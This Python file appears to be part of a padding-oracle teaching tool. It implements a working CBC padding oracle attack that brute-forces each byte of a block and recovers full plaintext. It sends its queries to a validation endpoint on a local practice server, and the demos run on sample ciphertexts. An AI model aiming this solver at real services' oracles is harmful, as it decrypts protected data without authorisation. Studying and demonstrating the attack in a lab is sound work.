# padding_oracle_solver.py
from __future__ import annotations
from dataclasses import dataclass, field
from typing import Callable, List, Tuple

import time
import requests

from pad_tickler.core.utils import b64_encode, b64_decode

SubmitFn = Callable[[bytes, bytes], bool]


@dataclass
class BlockStats:
    tries: int = 0
    positives: int = 0
    negatives: int = 0
    confirmed_hits: int = 0
    notes: List[str] = field(default_factory=list)


@dataclass
class SolveBlockResult:
    i_bytes: bytes           # recovered I_i (pre-XOR intermediate)
    p_bytes: bytes           # recovered plaintext block (requires original C_{i-1}/IV)
    stats: BlockStats


@dataclass
class SolveMessageResult:
    plaintext: bytes
    intermediates: List[bytes]
    per_block: List[SolveBlockResult]


def _confirm_hit(submit: SubmitFn, cprev_prime: bytearray, ctarget: bytes, k: int) -> Tuple[bool, int]:
    """
    Flip a byte **outside** the last k bytes (i.e., index < 16 - k) and re-submit.
    If still valid, treat as a confirmed padding hit for this k.
    Returns (confirmed, flipped_index_or_-1).
    """
    bsz = len(ctarget)
    flip_idx = (bsz - k - 1)
    if flip_idx < 0:
        # No non-tail byte to flip (this happens at k == block_size). Accept as confirmed.
        return True, -1

    c2 = cprev_prime[:]
    c2[flip_idx] ^= 0x01
    ok2 = submit(bytes(c2), ctarget)
    return ok2, flip_idx


def solve_block(
    submit: SubmitFn,
    cprev_original: bytes,     # original previous block (IV for block 0)
    ctarget: bytes,            # target ciphertext block C_i
    *,
    block_size: int = 16,
    skip_trivial_original: bool = True,
) -> SolveBlockResult:
    """
    Recover I_i (and P_i) for a single CBC block using a padding oracle.
    Only sends two-block messages: (C'_{i-1} || C_i).
    """
    assert len(cprev_original) == block_size and len(ctarget) == block_size
    stats = BlockStats()
    last = block_size - 1

    # Storage for intermediate bytes I_i (fill right->left)
    I = [None] * block_size  # type: ignore

    # We'll mutate a working copy of C_{i-1}
    cprev_prime = bytearray(cprev_original)

    # Optional: observe whether the original pair is valid (not used for logic)
    ok_orig = submit(cprev_original, ctarget)
    stats.tries += 1
    if ok_orig:
        stats.positives += 1
        stats.notes.append("original pair decrypts to valid PKCS#7")
    else:
        stats.negatives += 1

    # For k = 1..block_size
    for k in range(1, block_size + 1):
        # 1) Program the already-solved tail bytes to decrypt as k
        #    tail indices: [block_size - (k-1), ..., block_size-1]
        for j in range(block_size - (k - 1), block_size):
            i_byte = I[j]
            if i_byte is None:
                # not solved yet (will happen only at start of each k)
                continue
            cprev_prime[j] = i_byte ^ k

        # 2) Brute-force the new target byte at i = block_size - k
        i = block_size - k
        original_at_i = cprev_original[i]

        found = False
        for g in range(256):
            # Skip trivial original only for k==1 (classic optimization)
            if skip_trivial_original and k == 1 and g == original_at_i:
                continue

            cprev_prime[i] = g
            ok = submit(bytes(cprev_prime), ctarget)
            stats.tries += 1
            if not ok:
                stats.negatives += 1
                continue

            # Positive: confirm by flipping a non-tail byte
            confirmed, flip_idx = _confirm_hit(submit, cprev_prime, ctarget, k)
            stats.tries += (0 if flip_idx == -1 else 1)  # _confirm_hit already counted internally
            if confirmed:
                stats.positives += 1 + (0 if flip_idx == -1 else 1)
                stats.confirmed_hits += 1
                I[i] = g ^ k
                found = True
                break
            else:
                # Not confirmed -> likely false positive (e.g., collided with larger original padding)
                stats.positives += 1
                stats.negatives += 1
                continue

        if not found:
            raise RuntimeError(f"No valid guess found at k={k} (i={i}); oracle not behaving like pure PKCS#7?")

    # Build bytes
    i_block = bytes(x for x in I)  # type: ignore
    # Plaintext uses the **original** previous block (not the mutated one)
    p_block = bytes((i_block[b] ^ cprev_original[b]) for b in range(block_size))

    return SolveBlockResult(i_bytes=i_block, p_bytes=p_block, stats=stats)


def solve_message(
    submit: SubmitFn,
    iv: bytes,
    ciphertext: bytes,
    *,
    block_size: int = 16,
) -> SolveMessageResult:
    """
    Solve all blocks of a CBC-encrypted message via a padding oracle.
    - iv: 16-byte IV (AES)
    - ciphertext: N*16 bytes
    Returns plaintext, intermediates per block, and per-block stats.
    """
    assert len(iv) == block_size
    assert len(ciphertext) % block_size == 0, "ciphertext must be block-aligned"

    blocks = [ciphertext[i:i + block_size] for i in range(0, len(ciphertext), block_size)]
    intermediates: List[bytes] = []
    per_block: List[SolveBlockResult] = []
    plaintext_parts: List[bytes] = []

    for idx, c_i in enumerate(blocks):
        print(f"Solving block {idx + 1}/{len(blocks)}...")
        c_prev = iv if idx == 0 else blocks[idx - 1]
        res = solve_block(submit, c_prev, c_i, block_size=block_size)
        intermediates.append(res.i_bytes)
        per_block.append(res)
        plaintext_parts.append(res.p_bytes)
        print(f"Block {idx + 1} solved: {res.stats.tries} requests, {res.stats.confirmed_hits} confirmed hits")

    return SolveMessageResult(
        plaintext=b"".join(plaintext_parts),
        intermediates=intermediates,
        per_block=per_block,
    )


def submit_http(prev: bytes, target: bytes) -> bool:
    ciphertext = prev + target
    ciphertext_b64 = b64_encode(ciphertext)
    payload = {
        "alg": "AES-128-CBC",
        "ciphertext_b64": ciphertext_b64
    }
    try:
        response = requests.post("http://127.0.0.1:8000/api/validate", json=payload, timeout=10)
        time.sleep(0.01)  # Small delay to prevent overwhelming the server
        return response.status_code == 200
    except Exception as e:
        print(f"Request failed: {e}")
        return False

def encrypt_plaintext(plaintext_b64: str) -> str:
    payload = {
        "plaintext_b64": plaintext_b64
    }
    response = requests.post("http://127.0.0.1:8000/api/encrypt", json=payload)
    if response.status_code != 200:
        raise ValueError(f"Failed to encrypt plaintext: {response.status_code} {response.text}")
    return response.json()["ciphertext_b64"]


def demo1():
    iv_hex = "2f818d406cf8f1ea5d22254273631ba1"
    ct_hex = "9ab1fe2c1eb7b586959bb646dee1686b"

    iv = bytes.fromhex(iv_hex)
    ct = bytes.fromhex(ct_hex)

    res = solve_message(submit_http, iv, ct, block_size=16)

    print("Plaintext (raw bytes):", res.plaintext)
    print("Plaintext (hex):", res.plaintext.hex(" "))
    for i, blk in enumerate(res.per_block):
        print(f"[block {i}] tries={blk.stats.tries} pos={blk.stats.positives} neg={blk.stats.negatives} confirmed={blk.stats.confirmed_hits}")

def demo2():
    ct_long3_b64 = "L4GNQGz48epdIiVCc2Mboflt7i8qi5spwF2Xvyl2tWuqWd9g3uSgl5gGmupYOjjihRV9o0A1Y5c0VRb/b/roDa9ic8EgnmN0GGhN5x8FrSte5fji98f1d25KfgWgSYoL"

    ct = b64_decode(ct_long3_b64)
    iv_hex = ct[:16].hex()
    ct_hex = ct[16:].hex()

    iv = bytes.fromhex(iv_hex)
    ct = bytes.fromhex(ct_hex)
    print(f"IV: {iv_hex}")
    print(f"CT: {ct_hex}")

    res = solve_message(submit_http, iv, ct, block_size=16)

    print("Plaintext (raw bytes):", res.plaintext)

def demo3():
    plaintext = """Bad stuff happens in the bathroom
I'm just glad that it happens in a vacuum
Can't let thеm see me with my pants down
Coasters magazine is gonna bе my big chance now
But I'll be outta here in no time
I'll be doing interviews and feelin' just fine
Today is gonna be a great day
I'll do Coasters magazine and blow everyone away
Let's be clear
I did absolutely nothing wrong, I'm not to blame, it's not my fault
This is just to say
If Gene had pooped like every day, this would have all just blown away
But he'll be out of there in no time
No one's gonna blame me, I'll be doing just fine
Today is gonna be a great day
If Teddy can't unstick my dad, I'll find another way"""

    pt_b64 = b64_encode(plaintext)
    ct_b64 = encrypt_plaintext(pt_b64)
    ct = b64_decode(ct_b64)

    iv = ct[:16]
    ct = ct[16:]

    print(f"IV ({type(iv)}, {len(iv)} bytes): {iv.hex()}")
    print(f"CT ({type(ct)}, {len(ct)} bytes): {ct.hex()}")

    res = solve_message(submit_http, iv, ct, block_size=16)
    print(f"Plaintext: {res.plaintext}")

if __name__ == "__main__":
    demo3()